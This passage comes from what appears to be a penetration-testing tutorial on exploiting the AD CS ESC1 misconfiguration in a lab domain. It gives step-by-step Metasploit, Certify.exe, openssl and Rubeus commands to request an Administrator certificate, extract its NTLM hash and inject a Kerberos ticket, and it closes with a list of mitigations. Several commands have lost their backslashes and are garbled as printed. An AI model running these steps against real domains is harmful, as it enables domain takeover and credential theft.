<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibSBx6hAGoemP2pXl6NYb2oUvibiGf0Vd30PWYe_kQd1Vv5zUt0-0YxmtOY0r7L1FZkKa1dhLvoBOff07i-VGTtjYfsg49TK3J_cj8aKDO8pnjsK3Ggrlo65x9uwWNs52uJydlLHMIrlaPwusqJFYvYcSkUak5TNTTsbfrU9t2kE5TgDhyPtdr4r4CafKD/s16000/19.png"/></span></p>
<p><span style="color: #000000;">This requests a Kerberos authentication certificate for Administrator.</span></p>
<p><span style="color: #000000;"> If successful, a .pfx certificate file is saved.</span></p>
<p><span style="color: #000000;"><strong>Step 3: Using certificates for Pass-the-Certificate (PtC) attacks</strong></span></p>
<p><span style="color: #000000;">Load the kerberos Module</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/kerberos/get_ticket
set rhosts 192.168.1.48
set domain ignite.local
set action GET_HASH
set username administrator
set cert_file /root/.msf4/loot/20250108132859_default_192.168.1.48_windows.ad.cs_493919.pfx
run</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3K5QLEEinHU0RJUyge_8KPELu6ikPoeMvyrapMVTwOhWiGKpz6HV-Z_ECyCTLhJXVai4HFpM5mL2eMLH_xG9Bv6sdzJ9i81ea2aY10Iz8wBWnXmvXIDCp36AHUwUGZWLdwGqYjCBtJ1MlV2fNo4JlQckZE490o9CPkmb8oYOshy40hLMQxw140ZaBPCgJ/s16000/20.png" alt="AD CS ESC1 Certificate Exploitation" width="1455" height="554"/></span></p>
<p><span style="color: #000000;">Uses NTLM hash authentication to move laterally with your favourite techniques and tools.</span></p>
<h4><strong><span style="color: #800000;">Method 3 : Certipy.exe</span></strong></h4>
<h5><span style="color: #000000;"><strong>Step 1: Vulnerable Certificate Template Existence </strong></span></h5>
<p><span style="color: #000000;">When logged in with any user belonging to the <strong>Domain Users</strong> group, such as the <strong>aarti</strong> user in this case, you can use your preferred tools to confirm the presence of a vulnerable template.  In this Case to do this, run the following command using <strong>Certify.exe</strong> — a Windows tool that helps enumerate and exploit AD CS vulnerabilities. The command listed below will display all certificate templates and flag any misconfigurations.</span></p>
<p><span style="color: #000000;">Run the command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certify.exe find /vulnerable /currentuser</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1A-5cLDPVQZlqcSGwGSXzfJjH9InwQ6eeJg3GLB2PgEve-SQfzzbrYzursrYLBor7-f766AVI-Qv4UucdWaSR6h-SYXIf-2bbAAkFgG3dWjhcz5t2vX2_gUAAtU-ZptSTRXfGPlHtwspzIBP3bSMI53A89XV_82TXBdEMWZkpaC_gfJfhixCDWQe5QeoI/s16000/50.png"/></span></p>
<p><span style="color: #000000;">You can also find for ENROLLEE_SUPPLIES_SUBJECT flag little down which confirms your template vulnerable to the attack.</span></p>
<h5><span style="color: #000000;"><strong>Step 2: Request a Certificate as Administrator</strong></span></h5>
<p><span style="color: #000000;">Once we identify a vulnerable template, request a certificate for Administrator.</span></p>
<p><span style="color: #000000;">Fire up the command as</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certify.exe request /ca:DCI.ignite.localignite-DC1-CA /template:Custom_ESC1 /altname:ignite.localadministrator</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgs5WPqJclKehyb6Sx3rOQ_5DUgZPIkU2p9NtmTH8_LRcuKhEKNrc_nGC4Sa2GqaczTliNKIXViRlpyq06U2akfD00HKtW1PVFTfFqMcz8MorDYpO6wt9RwPZ9StD1s9trzenVNh4lfGAu5C4FMMRaqG6vmQ7g91J_LSsDKh7OqD8dVqygAHXgCWP-h0DJh/s16000/51.png" alt="AD CS ESC1 Certificate Exploitation" width="2046" height="1656"/></span></p>
<p><span style="color: #000000;">Requests a certificate and saves it as a .pfx file (e.g., cert.pfx). You can use tools of your choice or same certify.exe tool to save the requested certificate here we move with the tool openssl to export the certificate</span></p>
<p><span style="color: #000000;">Launch the command as</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">.openssl pkcs12 -in cert.pem -keyex -csp "Microsoft Enhanced Cryptographicprovider v1.0" -Export -out c:Userspubliccert.pfx</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjf1EySgpBAdx2RagnKQQ3jOiExS904rr9goCLLspYmMRNwx24eKh3qaaFS9xj1W8dxAIxUcca98CKzf8EQVq-2Aw2TADA2HSAwYRrUp80IPoE3i91mmay8I8nyox5pUrHeDMzqK5NEswPtFrDZKKpBxpC8gx5RQy9w1j7TdqzgDxE47cPUFFlcTDSUCpyv/s16000/52.png"/></span></p>
<p><span style="color: #000000;"> Although we have successfully generated the authentication certificate, we are unable to access the C$ share when attempting to list it via SMB by using the command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dir \dc1.ignite.localC$</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyA2N3To76Me3LmZtRuKwD-UfUw8gnp03D_wlscOGRK1wXiLTEbKkEcx1mEGRVpLwFhER00pzZzcGcjSPS0870QarBRbAZGtWMp6x0YWlq4xa3JbWCy5QPX0wISQhUXRiJg4CPi9RSaS9KQVtRFbsz9N2d1KW3FdrvA5BYkOp5227D3Kw9rlTyhIK-AEqd/s16000/53.png"/></span></p>
<h5><span style="color: #000000;"><strong>Step 3: Requesting a Kerberos TGT using the certificate</strong></span></h5>
<p><span style="color: #000000;">Now lets try Rubeus.exe to obtain a ticket Granting Ticket (TGT) for administrator from the domain controller. If Sucessful , the output will contain a Base64-Encoded TGT</span></p>
<h5><span style="color: #000000;"><strong>Step 4: Inject the TGT into the current session</strong></span></h5>
<p><span style="color: #000000;">Once we have TGT, we can inject it into the memory to assume administrator privileges</span></p>
<p><span style="color: #000000;">Just fire the command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">.Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhEqF_9nYihJ4BIs16__aMVLD8PeUMMJO_1VPZG3l2RDPxBO9udq_wB5j3zh7EPiszazPQZN__tsiGz_8qJS5yR9dehx8V_96kwEoEsMSIQrGvuauIUbHr6SUWQBIaVDhCBfyzSti1c6bQ8PetYbk0we2uJT_YjJpzXjD28b5O5muZr2CbKW8gHwEcukaDZ/s16000/54.png" alt="AD CS ESC1 Certificate Exploitation" width="1394" height="1823"/></span></p>
<p><span style="color: #000000;">This enables the current session to operate as administrator you can verify it with use of ticket for privilege escalation by just trying to access the path C$ of DC.</span></p>
<h3><span style="color: #800000;">Mitigation Strategies</span></h3>
<ul>
<li><span style="color: #000000;">Restrict Certificate Template Permissions → Only privileged users should have enrollment rights.</span></li>
<li><span style="color: #000000;">Enforce Strong Cryptography → Use RSA 3072/4096-bit and SHA-256/SHA-512.</span></li>
<li><span style="color: #000000;">Disable User-defined SAN Attributes → Prevent unauthorized impersonation.</span></li>
<li><span style="color: #000000;">Monitor Certificate Issuance → Enable auditing for Event IDs 4886, 4887, 4768.</span></li>
<li><span style="color: #000000;">Implement Certificate Revocation Policies → Use CRLs and OCSP to invalidate stolen certificates.</span></li>
</ul>
<p><span style="color: #000000;">To prevent AD CS ESC1 certificate exploitation, organizations must implement strong security measures. Regular audits of certificate templates and correct configuration of AD CS can mitigate the risks of such vulnerabilities.</span></p>
<p><span style="color: #000000;">Author: MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/ad-certificate-exploitation-esc2/" title="AD Certificate Exploitation: ESC2">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">AD Certificate Exploitation: ESC2</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/" title="ADCS ESC4: Vulnerable Certificate Template Access Control">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC4: Vulnerable Certificate Template Access Control</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/readgmsapassword-attack/" rel="prev">Credential Dumping: GMSA</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/sapphire-ticket-attack-abusing-kerberos-trust/" rel="next">Sapphire Ticket Attack: Abusing Kerberos Trust</a></div></div>
	</nav>        </div>
